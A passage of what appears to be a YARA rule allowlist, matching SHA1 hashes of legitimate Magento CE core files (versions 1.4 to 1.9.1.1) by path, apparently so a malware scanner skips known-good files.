		hash.sha1(0, filesize) == "5671193e8b5f0d6099382476b110a199cbd648d9" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "8c4b2e07d3f643e9a371772a7cf7b0ead9462270" or // app/code/core/Mage/Adminhtml/Model/Url.php
		hash.sha1(0, filesize) == "95d8cc1b6a755466ed30d4a306a36d75ef1874f1" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Fieldset.php
		hash.sha1(0, filesize) == "930af3e546e73fdd7ac82d53a8ccf618ce13316b" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Field.php
		hash.sha1(0, filesize) == "40cf1134b4ff2088bab26b0d29902f4efe875456" or // app/code/core/Mage/Adminhtml/Block/Customer/Edit/Renderer/Region.php
		hash.sha1(0, filesize) == "a9fbc4360285f686040a1fb42e19ae121ef37e1b" or // app/code/core/Mage/Adminhtml/Block/Catalog/Product/Edit/Tab/Options/Option.php
		hash.sha1(0, filesize) == "cefa8a549ad1ddc4cac45725b83f7a7517041203" or // app/design/frontend/default/iphone/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "f890c4755c69dd318efde4620962b5edd816bc9e" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "3df4377b9682ef76344b5eacdc43acf6a6484e7a" or // lib/Varien/Autoload.php
		hash.sha1(0, filesize) == "aebbeca270ebba508ac3a9e1c178a359006e8dad" or // lib/Varien/Data/Form/Element/Gallery.php
		hash.sha1(0, filesize) == "16615eee0a74cde38b34767a777ce10dbe0dd7c9" or // lib/Varien/Data/Form/Element/Editor.php
		hash.sha1(0, filesize) == "7832f3a823fe08c5494f5c42a964f49790fb86f2" or // lib/Varien/Data/Form/Element/Image.php
		hash.sha1(0, filesize) == "c0c772d84c95e4737c4ac4849be4129e3e17447f" or // lib/Varien/File/Uploader.php
		hash.sha1(0, filesize) == "b8734fb02aa55fb19bacc16e848b88681b29f493" or // lib/Zend/View/Helper/HeadScript.php
		hash.sha1(0, filesize) == "8a7d49626f09ce662f3a4b2d7c5c2b63e3a0b849" or // lib/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "c3363ec292bb5cb07ad938853030c127d2b6ef97" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "b5499e5b6ce9bf40b7428cb5d8ba75af73cf36f1" or // lib/Zend/Soap/Client.php
		hash.sha1(0, filesize) == "063158d99db2cff6927ddb42d3b342c383f086bd" or // lib/Zend/Service/ReCaptcha/MailHide.php
		hash.sha1(0, filesize) == "d97634b7981e003503949f09fa5296658bf29bf4" or // lib/Zend/Amf/Server.php
		hash.sha1(0, filesize) == "ba5c8b927ccdfff1139ee6274d5cf6c9954bd706" or // lib/Zend/Session/Exception.php
		hash.sha1(0, filesize) == "b3904d9bd5b510249b6607c13adec6aff159b3a4" or // lib/Zend/Date/DateObject.php
		
		/* Magento CE 1.4.0.1 */
		
		/* Magento CE 1.4.1.0 */
		hash.sha1(0, filesize) == "c26d82fca7498e54640b615fabef8c4d45c6655d" or // app/code/core/Mage/GoogleCheckout/Block/Adminhtml/Shipping/Merchant.php
		hash.sha1(0, filesize) == "72863ffa4faa9bb2dd735611afe1310c58aff7f4" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "21ba19ce0f50a4084301e8689f2f7cda2f971204" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "fcd994fe6f9c177e32d64f2dbc11344306da73d8" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "2164a2692f6a7d4a0fe1589b9e2822f3b51a0363" or // app/code/core/Mage/Core/Model/Convert/Profile.php
		hash.sha1(0, filesize) == "b8435034f33e6261ae700052bf6fa9d8b0f821bd" or // app/code/core/Mage/Core/Model/Translate/Inline.php
		hash.sha1(0, filesize) == "a59a390c12706e4aa74e1f91868c8773cfbbbd81" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Category.php
		hash.sha1(0, filesize) == "640c7e18fc10ccb14b9b0fd2ff336f3894928cfb" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Product.php
		hash.sha1(0, filesize) == "91460799f6a9c6385e9878fd0a79624b8112d079" or // app/code/core/Mage/Directory/Model/Mysql4/Currency.php
		hash.sha1(0, filesize) == "a61f87f2c29575ca5d31933daa9bb4e0c35cc7c5" or // app/code/core/Mage/Catalog/Block/Product/View/Options/Type/Select.php
		hash.sha1(0, filesize) == "ec5cfd2435a4fb385d5fb3f43249618091d4b1f2" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "34c3ae9b10cc1e3dcd346406daad972de2a9f53a" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Fieldset.php
		hash.sha1(0, filesize) == "f1d50bfd4dc8cf023bb2467928ee07b8ca277f1f" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Field.php
		hash.sha1(0, filesize) == "04e7dc316cd70f8851e27d2f1ee094003c79191d" or // app/code/core/Mage/Adminhtml/Block/Customer/Edit/Renderer/Region.php
		hash.sha1(0, filesize) == "75c0b78644517ab431cd2067aeb4c9b606fe5629" or // app/code/core/Mage/Adminhtml/Block/Catalog/Product/Edit/Tab/Options/Option.php
		hash.sha1(0, filesize) == "3bb4df77cbfd37d70c24621a0e1819059bd06a74" or // app/design/frontend/default/iphone/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "2a78243468ee200ee3933d03fc2b52f375516b24" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "3133a72daf3fe6f51778fa89e07f7c7c07de9493" or // lib/Varien/Data/Form/Element/Editor.php
		hash.sha1(0, filesize) == "5129a7555895007ecc2a1975fcd91cf2d0d8abe1" or // lib/Varien/File/Uploader.php
		hash.sha1(0, filesize) == "e4269e6d47cbb5c606e916e1fcd80c1acc131e55" or // lib/Zend/Locale/Format.php
		
		/* Magento CE 1.4.1.1 */
		
		/* Magento CE 1.4.2.0 */
		hash.sha1(0, filesize) == "47576a4be1d4f450436ceef01f4d76561b49c10f" or // app/code/community/Find/Feed/Model/Import.php
		hash.sha1(0, filesize) == "b5503689bc6a42a1223019adfde7680b643bba92" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "428645582e2c32c01ce4fbed0efc865a86cc1ce1" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "2ed7f109642dbfec32434d722caea3ba919b78b1" or // app/code/core/Mage/GoogleBase/Model/Service/Item.php
		hash.sha1(0, filesize) == "59eca17b433527c716e39a79c2a6624267039031" or // lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "aac39b74fe44c73becdbc55e1e13a07834f446ae" or // lib/Varien/Pear.php
		hash.sha1(0, filesize) == "be6109e866f11177febd1a4adff8b8f15dcd7d4b" or // lib/Varien/Data/Form/Element/Editor.php
		hash.sha1(0, filesize) == "382fb51970f59f803508285ee8d2c4a2616ecc73" or // lib/Varien/Data/Form/Element/Multiline.php
		hash.sha1(0, filesize) == "9c0c57a9d2df145526cbde494e00f0798ec40379" or // lib/Varien/File/Uploader.php
		hash.sha1(0, filesize) == "da6dbd6d8183b366dbf5ec1b4da8a064375452e3" or // lib/Zend/Session.php
		hash.sha1(0, filesize) == "af5d43214068dd919d70a61b66fb4b1761957b24" or // lib/Zend/View/Helper/HeadScript.php
		hash.sha1(0, filesize) == "4d80fe8363e9d04cb962d50b3d0d88f039673a0d" or // lib/Zend/Validate/File/MimeType.php
		hash.sha1(0, filesize) == "11a78fc89381ba37849a82529b024c656d9025d4" or // lib/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "7d086827328b7494bc490fb7206b3366d2c38e6f" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "63283e976d5fea1f63c18e8a6793b3a4ab9d71d4" or // lib/Zend/Soap/Client.php
		hash.sha1(0, filesize) == "1e9a01653ac90098c876b77e97e3670589ec3787" or // lib/Zend/Serializer/Adapter/PhpCode.php
		hash.sha1(0, filesize) == "d75195ee5082cf62a51e1055e421ee8d4a2143b8" or // lib/Zend/Amf/Server.php
		hash.sha1(0, filesize) == "078401aeda210badab9ef4fc083a1b75292b2207" or // lib/Zend/Session/Exception.php
		hash.sha1(0, filesize) == "29ab7310cee069c1f6d76b53ec66a9edbd723de9" or // lib/Zend/Date/DateObject.php
		hash.sha1(0, filesize) == "20bf0974e247e157a44f3582ec075ea0d151e446" or // lib/Zend/Ldap/Converter.php
		
		/* Magento CE 1.5.0.0 */
		hash.sha1(0, filesize) == "ca04390be3a2fb9125cc190f85eb6dc1ec99166a" or // downloader/Maged/Connect.php
		hash.sha1(0, filesize) == "d8521a4b500badf5608b9eefb1e7d4923d5c099c" or // downloader/lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "542d271f564aa019943e9b5c9e82ba752da3807b" or // app/code/community/Find/Feed/Model/Import.php
		hash.sha1(0, filesize) == "ec386833ed576acee6a0cffae893d727b4fe20f5" or // app/code/core/Mage/ImportExport/Model/Import/Adapter.php
		hash.sha1(0, filesize) == "fe81b3452d5224fa03d122348ebd25fd6cf2bfe2" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Customer.php
		hash.sha1(0, filesize) == "7e847df572b49a30b533058488d47256243281c5" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Product/Type/Abstract.php
		hash.sha1(0, filesize) == "b8ec0477409e6a3cf29ef2f5a51dd18457630fc5" or // app/code/core/Mage/XmlConnect/Block/Adminhtml/Mobile/Form/Element/Image.php
		hash.sha1(0, filesize) == "3e4338a076ef79058f5a069a7c07c8c14aae5655" or // app/code/core/Mage/Core/Model/Translate/Inline.php
		hash.sha1(0, filesize) == "4d4913c1f71c8b77ce1748fc1ed2f9c7af26f0e9" or // app/code/core/Mage/Catalog/Block/Product/View/Options/Type/Select.php
		hash.sha1(0, filesize) == "6409bc5c48b2676c7592c490363f8dbda40f8cb6" or // lib/Varien/Data/Form/Element/Image.php
		hash.sha1(0, filesize) == "8bb683957e1d561f60a0c311f532543b16d70946" or // lib/Varien/File/Uploader.php
		hash.sha1(0, filesize) == "87cf0da9bfefa24aa8984a902200cf3c073d57af" or // lib/Zend/View/Helper/HeadScript.php
		hash.sha1(0, filesize) == "3686394c1369d3c95d2d4eb6e55af54f2c217edb" or // lib/Zend/Validate/File/MimeType.php
		hash.sha1(0, filesize) == "51f42d5712d78d3949e625bdbb1164fa5df21f37" or // lib/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "8fee7dddf97ee0020242555eb7b4a210ee0c5ddf" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "997e8decd0cd34c4a5740adb8a54ab1192227a72" or // lib/Zend/Soap/Client.php
		hash.sha1(0, filesize) == "72077639b329556270e1cb8f67607e3a12818ecc" or // lib/Zend/Form/Decorator/HtmlTag.php
		hash.sha1(0, filesize) == "168196bd79743a1726e6f9c51b8cded7f379071c" or // lib/Zend/Serializer/Adapter/PhpCode.php
		hash.sha1(0, filesize) == "de086d6b6b7bd97c8cc02a5e71711625b5aa21f4" or // lib/Zend/Amf/Server.php
		hash.sha1(0, filesize) == "1f44a0506e92fbc4b93f630f2d4e269144e34c98" or // lib/Zend/Date/DateObject.php
		
		/* Magento CE 1.5.0.1 */
		
		/* Magento CE 1.5.1.0 */
		hash.sha1(0, filesize) == "1c1573c2f8fb87dc6d7fa4a86f9bed3966ab1559" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "e219e7d6a09ace697b471c1dff1e818a089e7bdb" or // lib/Varien/Data/Form/Element/Multiline.php
		hash.sha1(0, filesize) == "1348243a2ef778d294f135f1eabd9b447a68276a" or // lib/Varien/File/Uploader.php
		
		/* Magento CE 1.6.0.0 */
		hash.sha1(0, filesize) == "7c7c0e823b7149758466ce1c46b31cc752098981" or // downloader/Maged/Connect.php
		hash.sha1(0, filesize) == "f5355295887c7c920faec7a6649a3b0e501ed562" or // downloader/lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "0d90dfcdadc2385454d6989c89e5619284d06a22" or // app/code/community/Find/Feed/Model/Import.php
		hash.sha1(0, filesize) == "ff8e400bbceefa8fb6ffdd7b6ca7c19424c3724c" or // app/code/core/Mage/ImportExport/Model/Import/Uploader.php
		hash.sha1(0, filesize) == "0cc50b85016c0a281d463eaea15d9a60c8dde353" or // app/code/core/Mage/ImportExport/Model/Import/Adapter.php
		hash.sha1(0, filesize) == "c7b1ac6cb88d57a1ecc9f1228530422418092734" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Customer.php
		hash.sha1(0, filesize) == "6f04c753855b120250fb93c3f18120439bac61a3" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Product/Type/Abstract.php
		hash.sha1(0, filesize) == "3ec46431440bbdd6dc012ec88ba8b2abb254a07a" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "08cd39581eebdce66eba747d99564f92aecd81bb" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "73d6f4ad968b6597969a846607c7fc4951da21f8" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "faf6a7d584a991040910bc3c1b75b1b953749dac" or // app/code/core/Mage/Core/Model/Translate/Inline.php
		hash.sha1(0, filesize) == "533d7cf5e90b1d7531d869a733c28a1d7b96c087" or // app/code/core/Mage/Sitemap/Model/Resource/Catalog/Category.php
		hash.sha1(0, filesize) == "8df77b8fb1861b3a7d56dea614e329072170c4d4" or // app/code/core/Mage/Sitemap/Model/Resource/Catalog/Product.php
		hash.sha1(0, filesize) == "c4fe77c103e8133560598cddd3f5b5d6d51000ef" or // app/code/core/Mage/Catalog/Block/Product/View/Options/Type/Select.php
		hash.sha1(0, filesize) == "e7d5e027d6d8d5aed1b7e6e2bb9c4823a244d81c" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "13f835ff37292f0f9cc6cf291c2d2c0bf3c6584d" or // app/code/core/Mage/Adminhtml/Model/Url.php
		hash.sha1(0, filesize) == "910a7ffd9e47fa7323afb954504e7f665959d0dc" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Fieldset.php
		hash.sha1(0, filesize) == "9eddbdda8933a43af895db0198b11212ec0f9ca9" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Field.php
		hash.sha1(0, filesize) == "ead5c7a448033fdad1d4a6703d4ffc3a46bd3b08" or // app/code/core/Mage/Adminhtml/Block/Customer/Edit/Renderer/Region.php
		hash.sha1(0, filesize) == "35fca9cb6bce8e10563f014a74e6832055f374be" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "1881995b15ffff36404400667af328064456caba" or // lib/Varien/Pear.php
		hash.sha1(0, filesize) == "a2c4546364372caac2b6565f6b74987df5e54e4e" or // lib/Varien/File/Uploader.php
		
		/* Magento CE 1.6.1.0 */
		
		/* Magento CE 1.6.2.0 */
		
		/* Magento CE 1.7.0.0 */
		hash.sha1(0, filesize) == "e37b356ab26b4d7acd052139f0ed063a4e242065" or // downloader/lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "a675fe32e519294e608a11e0e7ad26c6c0ee39e9" or // app/code/core/Mage/ImportExport/Model/Import/Uploader.php
		hash.sha1(0, filesize) == "21396b418469673c1092f0ab94633f188d7baf15" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Customer.php
		hash.sha1(0, filesize) == "dde0fd41aff7a751e69528f12eecdcb79261239a" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Product/Type/Abstract.php
		hash.sha1(0, filesize) == "948a6b886901cae250b4314f7ec1880b5bcd98ee" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "80b6306a8752dde8cebe44334f1c30e60509cae4" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "64c3885b5a8fc86af29bd6f08976d2da87727ddc" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "20a1cd0eb6f110bb98f35f2499614cb442959462" or // app/code/core/Mage/Sitemap/Model/Resource/Catalog/Category.php
		hash.sha1(0, filesize) == "8b45c11270942e161b69e71e49e1595dc388ad8f" or // app/code/core/Mage/Sitemap/Model/Resource/Catalog/Product.php
		hash.sha1(0, filesize) == "2af8367688d9131c9fb5c6c749f92d46dd216d3e" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "a81945dcfc4fcf2e464669f02fc03bc09b231420" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Field.php
		hash.sha1(0, filesize) == "0b4971706ce32b91df9649f61c0dbe52fa3c025b" or // app/design/frontend/default/iphone/template/catalog/product/view/media.phtml
		hash.sha1(0, filesize) == "b665a86b2caabb9efcf1c2013268cae2ec52dae5" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "9f7c657e9cb4caeeef7fbdf7658bcb93fb7f504e" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		hash.sha1(0, filesize) == "9e002eb833e32a1d8bf0e05b8f817d8e3788e6d3" or // lib/Varien/Autoload.php
		hash.sha1(0, filesize) == "744c53013d70f0ef8d60a4e6ff532d50aba2c798" or // lib/Varien/File/Uploader.php
		hash.sha1(0, filesize) == "53ad2d03a76e1460b5c0ce75b1bcee79d5f96e5a" or // js/tiny_mce/tiny_mce_jquery_src.js
		hash.sha1(0, filesize) == "5d709e1db0c76651ff2e04084349b41ec8ac349e" or // js/tiny_mce/tiny_mce_prototype_src.js
		hash.sha1(0, filesize) == "26684d59fecefd29796e1ce35b9c8fde4001f80d" or // js/tiny_mce/tiny_mce_src.js
		
		/* Magento CE 1.7.0.1 */
		hash.sha1(0, filesize) == "a5dce2ba92736f0d1e33769d697b1777ddbadd98" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Field.php
		
		/* Magento CE 1.7.0.2 */
		
		/* Magento CE 1.8.0.0 */
		hash.sha1(0, filesize) == "f4bfc9f458bdadf338482afddaa80530b1eb668f" or // cron.php
		hash.sha1(0, filesize) == "78f63461659a1a430b9e95910e3ad40daee0d7c4" or // downloader/lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "47bc9993a2ae847ee1baded420bc864a9e2add82" or // app/code/core/Mage/ImportExport/Model/Import/Uploader.php
		hash.sha1(0, filesize) == "2ea72c5b3160e44b1ab812e40a002fd3ffb47e01" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Customer.php
		hash.sha1(0, filesize) == "6053ccb397bd3237772c950e0c926f852a3231ed" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Product/Type/Abstract.php
		hash.sha1(0, filesize) == "c5359f0b869bfc7d07d669dea5996fecdfb01ad7" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "444479b4ce40a0c8e592d68a87c971934008a245" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "90f041175c2cea0f0663afa30f588fe4dad5b123" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "87feb95a759d68eb37cbed972425276586ae02bf" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "51b39b52f31bd6376a99979ad1235ad1f5e4cb94" or // app/code/core/Mage/Adminhtml/Model/Url.php
		hash.sha1(0, filesize) == "2e2be1472eafa5164fb0c5926942ca9bfe670d2f" or // app/design/frontend/default/iphone/template/catalog/product/view/media.phtml
		hash.sha1(0, filesize) == "f0cfbfa1652bc187ad818823d9021507aa483610" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "44034f3de404aff9ca5b4bd177814ccf1a488a91" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		hash.sha1(0, filesize) == "58fe31ecb9fed1ea5e1ec6e5b9cbd7339000be21" or // lib/Varien/File/Uploader.php
		
		/* Magento CE 1.8.1.0 */
		hash.sha1(0, filesize) == "2a72c042ddf3151bc189a1a1abee570911e5b90f" or // cron.php
		
		/* Magento CE 1.9.0.0 */
		hash.sha1(0, filesize) == "beb8fa0b00d09fe07c4250b57638207d2baf58a9" or // app/code/core/Mage/ImportExport/Model/Import/Uploader.php
		hash.sha1(0, filesize) == "e49b97bd3d87338e45952d3c14110f8c58ff2944" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Customer.php
		hash.sha1(0, filesize) == "0845429e8d7ec4db23031fa8567712b620716ce3" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Product/Type/Abstract.php
		hash.sha1(0, filesize) == "030222d390a79416396528a36d00bd8782f42b44" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "c20d1956300ab8a7c7249327fad8460e26bfe5a4" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "57b95e9be59894c37bc07a8ef8ec90b9599c1b4b" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "882cf7e8f1edef0e29af45c97243918e41ac8ed8" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "d8cda57af7063c1727837dd8da9db48a67258126" or // app/code/core/Mage/Adminhtml/Model/Url.php
		hash.sha1(0, filesize) == "1f80886d6860858d4b67d021c374a167a4452a9f" or // app/design/frontend/default/iphone/template/catalog/product/view/media.phtml
		hash.sha1(0, filesize) == "6e7249490d2717c9b8472fbd045c7603752bf09d" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "3edb4a845c40b7bd58a3c420c643fd1848d29a4a" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		hash.sha1(0, filesize) == "56a365dec8f4871ff38b8d157557cd44c99a0f58" or // lib/Magento/Autoload/Simple.php
		hash.sha1(0, filesize) == "257622b757cb7a54fd2ca5248e1a36ebcd804cc0" or // lib/Zend/Session.php
		hash.sha1(0, filesize) == "6b5a32540833318714c783e546219d1ec7ff1d4c" or // lib/Zend/Tool/Project/Provider/Test.php
		hash.sha1(0, filesize) == "0f4d1b153641f3e38355e7b6e77d2ef0795d502a" or // lib/Zend/Validate/File/MimeType.php
		hash.sha1(0, filesize) == "d22c5d0518d02777887e16d52b8505aaa7f4165d" or // lib/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "474e85d94ee74b3837b48ab9b0dcec24eb834974" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "8fa67d2a0a56159c7c45031d11fab3f8050c526d" or // lib/Zend/Soap/Client.php
		hash.sha1(0, filesize) == "ca6aec4ee5075ab676dc0834beebb16671535650" or // lib/Zend/Service/WindowsAzure/CommandLine/Scaffolders/DefaultScaffolder.phar
		hash.sha1(0, filesize) == "834db01a738509c1e104f97d5cd900c7b10d7205" or // lib/Zend/Service/WindowsAzure/CommandLine/Scaffolders/DefaultScaffolder/resources/PhpOnAzure.Web/resources/WebPICmdLine/Microsoft.Web.PlatformInstaller.UI.dll
		hash.sha1(0, filesize) == "a635e99c23f43b460511a7017cbde6020bb100b9" or // lib/Zend/Serializer/Adapter/PhpCode.php
		hash.sha1(0, filesize) == "843ff3ac422f19112c787b2ef63ae4e3341b6d16" or // lib/Zend/Amf/Server.php
		hash.sha1(0, filesize) == "0c76cda5268b7c886f075491ab2e0857edf1f30c" or // lib/Zend/Date/DateObject.php
		hash.sha1(0, filesize) == "08da1d6d302bd33f27081c3198ceeb6d902dfd00" or // lib/Zend/Ldap/Converter.php
		
		/* Magento CE 1.9.0.1 */
		
		/* Magento CE 1.9.1.0 */
		hash.sha1(0, filesize) == "5cc804265e9d69991e22aa92c82663fd03b1e9b8" or // app/code/core/Mage/ImportExport/Model/Import/Uploader.php
		hash.sha1(0, filesize) == "4866408493f2f83827ef0fd1d7fce1802d219cf3" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Customer.php
		hash.sha1(0, filesize) == "5b534fb113a2a6e555bcb09d80576c8d92cc45f0" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Product/Type/Abstract.php
		hash.sha1(0, filesize) == "f3b3eceb9c06bc59f23387c462b7817480efe1af" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "3d560f39b99e47b72ede84e7d6ac69e198c22098" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "e782aee39e228d0fbb0bb894b740961c156eef5a" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "0c882e8ac2d88a395fc14da2b1eab649bf1be462" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "91135f179fdbee4ac3806abba6120db0b73e6dbc" or // app/code/core/Mage/Adminhtml/Model/Url.php
		hash.sha1(0, filesize) == "07c71d2a531adb843589c60f42f940c4f3fe7dbe" or // app/design/frontend/default/iphone/template/catalog/product/view/media.phtml
		hash.sha1(0, filesize) == "71b10a4a0cd8956f30e5ce13a91e6bbd74fa5421" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "410f0ba42bc4ffa69cf140768352368a3d09f73a" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		hash.sha1(0, filesize) == "6be0dccd49f9878749ef9a85963e7f8d75b4d40d" or // lib/Magento/Autoload/Simple.php
		hash.sha1(0, filesize) == "a36be33cb14a5803bf0f4a6e188f6a0b16077853" or // lib/Varien/Autoload.php
		hash.sha1(0, filesize) == "ad57a755258346b526d694d2bc515b4171d16ea7" or // lib/Zend/Session.php
		hash.sha1(0, filesize) == "9d370bde321e7d936025773e0b3a8f7f01882f67" or // lib/Zend/Tool/Project/Provider/Test.php
		hash.sha1(0, filesize) == "62f77a3c4e2ea1ce8d00fe62a8065c3c2a892118" or // lib/Zend/Validate/File/MimeType.php
		hash.sha1(0, filesize) == "b8b3dbb3fb548a70b7ffb249862cb20c2e8826eb" or // lib/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "f2c2a12241d8d571acafeb4ddfb7920c4b41ce9b" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "761b8134d057822aebd9b25599759593a62b59a8" or // lib/Zend/Soap/Client.php
		hash.sha1(0, filesize) == "32a5acd82a2e9163ca05a125c359e7f751ae55f3" or // lib/Zend/Serializer/Adapter/PhpCode.php
		hash.sha1(0, filesize) == "5699310fb6d6e827050e152f99a085b88b05e488" or // lib/Zend/Amf/Server.php
		hash.sha1(0, filesize) == "8864eef8ceda89c902d033be651a9353e3cf5e73" or // lib/Zend/Date/DateObject.php
		hash.sha1(0, filesize) == "ebe09e979a43c009fbea2d65ce01ab7941cfa49a" or // js/tiny_mce/tiny_mce_jquery_src.js
		hash.sha1(0, filesize) == "f7ce9a2c3cddf03aa2069b3a4faaa4b4011a8571" or // js/tiny_mce/tiny_mce_prototype_src.js
		hash.sha1(0, filesize) == "77abde98292c0e2ea60c3cb796f4eda512eaa575" or // js/tiny_mce/tiny_mce_prototype.js
		hash.sha1(0, filesize) == "10de582f689b58d046d08da55fdfbf90c08524f5" or // js/tiny_mce/tiny_mce_jquery.js
		hash.sha1(0, filesize) == "e4473407525b5d622aaaa3f626946c6ef3ce3c1a" or // js/tiny_mce/tiny_mce.js
		hash.sha1(0, filesize) == "818d1825aef53ec014568c10181d75e88491f9d0" or // js/tiny_mce/tiny_mce_src.js
		hash.sha1(0, filesize) == "9539b243cb405912b865b0db36b312a9fe44d510" or // js/tiny_mce/plugins/paste/editor_plugin_src.js
		
		/* Magento CE 1.9.1.1 */
		hash.sha1(0, filesize) == "1a5df06c6ba7b717825db8d55e2ad3db8c834637" or // cron.php
		hash.sha1(0, filesize) == "abbd120b50f030bdd61e2ac14511d549cfac72f9" or // app/code/core/Mage/ImportExport/Model/Import/Uploader.php
		hash.sha1(0, filesize) == "02bfd222251a3b35bff55c213a6e8126a2e60784" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Customer.php
		hash.sha1(0, filesize) == "0c11c755b73650408655af02ea304786bbafbe9d" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Product/Type/Abstract.php
		hash.sha1(0, filesize) == "f8fcce0810ed8610fdc3d3dfa164d95835f84d93" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "3734e1824e4ad9f0516344427f4cc246ae00776a" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "5f65da3c0df60ac43befc42ea990639da9a89039" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "947e91de8554856c73ade2a1c9e6fecb725a26d3" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "4079c07a1059350c4d1e5a0bd3ad955cc4d02738" or // app/design/frontend/default/iphone/template/catalog/product/view/media.phtml
		hash.sha1(0, filesize) == "2b2d9c9ebe2144fe52d0e0be0cca17ea1285dbe7" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "45ea8b1dbffc1166987d889780fa9e990c02836f" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		hash.sha1(0, filesize) == "3b404a87888f839158b19e748c71bad0b0908605" or // lib/Magento/Autoload/Simple.php
